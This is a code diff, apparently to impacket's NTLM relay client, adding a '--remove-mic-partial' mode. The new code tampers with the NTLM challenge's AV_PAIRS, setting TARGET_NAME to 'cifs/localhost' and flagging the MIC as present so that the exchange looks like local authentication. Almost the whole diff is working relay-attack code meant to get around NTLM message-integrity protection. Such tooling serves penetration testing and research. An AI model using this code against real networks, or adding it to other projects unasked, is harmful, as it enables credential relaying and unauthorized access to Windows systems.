@@ -396,6 +396,33 @@ class SMBRelayClient(ProtocolClient):
             except Exception as e:
                 LOG.debug('[SMB] sendNegotiate: Could not parse challenge AV_PAIRS: %s' % str(e))
 
+        # For --remove-mic-partial mode, modify challenge AV_PAIRS to signal local authentication
+        if self.serverConfig.remove_mic_partial and challenge['TargetInfoFields']:
+            try:
+                from impacket.ntlm import AV_PAIRS, NTLMSSP_AV_TARGET_NAME, NTLMSSP_AV_FLAGS
+                av_pairs = AV_PAIRS(challenge['TargetInfoFields'])
+
+                # Add TARGET_NAME as "cifs/localhost" to signal local authentication
+                # This is what Windows uses for local loopback connections
+                target_name = 'cifs/localhost'.encode('utf-16le')
+                av_pairs[NTLMSSP_AV_TARGET_NAME] = (len(target_name), target_name)
+                LOG.debug('[SMB] sendNegotiate: Modified challenge - added TARGET_NAME = "cifs/localhost"')
+
+                # Optionally add AV_FLAGS with MIC present flag (0x00000002)
+                # This signals that MIC is expected in the response
+                av_flags = (4, (0x00000002).to_bytes(4, byteorder='little'))
+                av_pairs[NTLMSSP_AV_FLAGS] = av_flags
+                LOG.debug('[SMB] sendNegotiate: Modified challenge - added AV_FLAGS = 0x00000002 (MIC present)')
+
+                # Update the challenge with modified AV_PAIRS
+                challenge['TargetInfoFields'] = av_pairs.getData()
+                self.challengeMessage = challenge.getData()
+                LOG.debug('[SMB] sendNegotiate: Challenge AV_PAIRS modified for local auth simulation')
+            except Exception as e:
+                LOG.error('[SMB] sendNegotiate: Failed to modify challenge AV_PAIRS: %s' % str(e))
+                import traceback
+                traceback.print_exc()
+
         LOG.debug('[SMB] sendNegotiate: Received challenge from server, returning to relay')
         return challenge
 
